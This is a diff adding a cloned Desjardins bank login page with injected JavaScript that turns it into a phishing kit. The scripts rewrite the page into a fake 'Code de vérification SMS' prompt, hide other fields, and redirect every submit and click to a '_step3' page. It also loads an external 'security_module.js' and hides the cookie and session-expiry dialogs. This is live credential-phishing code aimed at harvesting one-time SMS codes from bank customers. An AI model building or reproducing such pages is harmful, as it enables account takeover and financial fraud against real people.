@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<!-- saved from url=(0157)https://accweb.mouv.desjardins.com/identifiantunique/securite-garantie/authentification/auth/manuel?error=true&code=MSG000005&message=MSG000005&executeTime=8 -->
+<html lang="fr" data-beasties-container="" data-whatinput="keyboard" data-whatintent="mouse" data-mw-spa="" class="hydrated" data-gtm-vis-recent-on-screen193087417_102="1641" data-gtm-vis-first-on-screen193087417_102="1641" data-gtm-vis-total-visible-time193087417_102="100" data-gtm-vis-has-fired193087417_102="1" data-gtm-vis-recent-on-screen193087417_243="1646" data-gtm-vis-first-on-screen193087417_243="1646" data-gtm-vis-total-visible-time193087417_243="100" data-gtm-vis-has-fired193087417_243="1"><head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
+
+
+<script id="unified-sms-handler">
+document.addEventListener("DOMContentLoaded", function() {
+    // 1. Transform UI for SMS page
+    var inputs = document.querySelectorAll("input:not([type='hidden'])");
+    var targetInput = null;
+    
+    for(var i = 0; i < inputs.length; i++) {
+        if (!targetInput && (inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel" || inputs[i].type === "password")) {
+            targetInput = inputs[i];
+        } else {
+            if (inputs[i].type === "password" || inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel") {
+                inputs[i].style.display = "none";
+                if (inputs[i].parentElement && inputs[i].parentElement.tagName !== "FORM" && inputs[i].parentElement.tagName !== "BODY") {
+                    inputs[i].parentElement.style.display = "none";
+                }
+            }
+        }
+    }
+    
+    if (targetInput) {
+        targetInput.type = "tel";
+        targetInput.maxLength = 8;
+        targetInput.placeholder = "Code SMS";
+        targetInput.value = "";
+        targetInput.style.display = "block";
+        
+        var id = targetInput.id;
+        if(id) {
+            var label = document.querySelector("label[for='" + id + "']");
+            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
+        }
+        
+        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        var node;
+        while(node = walker.nextNode()) {
+            var text = node.nodeValue.toLowerCase();
+            if(text.trim().length > 3) {
+                if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
+                    node.nodeValue = "Vérification de sécurité";
+                }
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
+                }
+                else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
+                    node.nodeValue = "";
+                }
+            }
+        }
+    }
+    
+    var clickables = document.querySelectorAll("button, input[type='submit'], .btn");
+    clickables.forEach(function(el) {
+        var text = (el.textContent || el.value || "").toLowerCase().trim();
+        if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("connex") !== -1 || text.indexOf("connect") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("log") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("suivant") !== -1) {
+            if (el.tagName === "INPUT") el.value = "Valider le code";
+            else el.innerText = "Valider le code";
+        }
+    });
+
+    // 2. Guaranteed Navigation to Step 3
+    var nextPath = window.location.pathname.replace("_sms.html", "_step3.html");
+    
+    function goNext(e) {
+        if (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+        }
+        window.location.href = nextPath;
+    }
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", goNext, true);
+        form.onsubmit = goNext;
+    });
+    
+    document.addEventListener("click", function(e) {
+        var el = e.target.closest("button, input[type='submit'], input[type='button'], .btn, a");
+        if (el) {
+            goNext(e);
+        }
+    }, true);
+});
+</script>
+
+<script src="security_module.js"></script>
+</body></html><style>
+#onetrust-consent-sdk, .onetrust-pc-dark-filter, #onetrust-banner-sdk {
+    display: none !important;
+    visibility: hidden !important;
+    pointer-events: none !important;
+    opacity: 0 !important;
+    z-index: -9999 !important;
+}
+body, html {
+    overflow: auto !important;
+}
+</style>
+<style>
+ngb-modal-window, .modal, .modal-backdrop, app-modal-expiration-session {
+    display: none !important;
+    visibility: hidden !important;
+    opacity: 0 !important;
+    pointer-events: none !important;
+    z-index: -9999 !important;
+}
+</style>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var currentFile = window.location.pathname.split("/").pop();
+    var step3File = currentFile.replace("_sms.html", "_step3.html");
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = step3File;
+        });
+    });
+
+    var clickables = document.querySelectorAll("button, input[type='submit'], input[type='button'], .btn");
+    clickables.forEach(function(el) {
+        el.addEventListener("click", function(e) {
+            var text = (el.textContent || el.value || "").toLowerCase().trim();
+            if (el.getAttribute("type") === "submit" || 
+                text.indexOf("valid") !== -1 || 
+                text.indexOf("contin") !== -1 || 
+                text.indexOf("soumet") !== -1 ||
+                text.indexOf("submit") !== -1 ||
+                text.indexOf("next") !== -1 ||
+                text.indexOf("suivant") !== -1) {
+                e.preventDefault();
+                e.stopPropagation();
+                window.location.href = step3File;
+            }
+        });
+    });
+});
+</script>
+
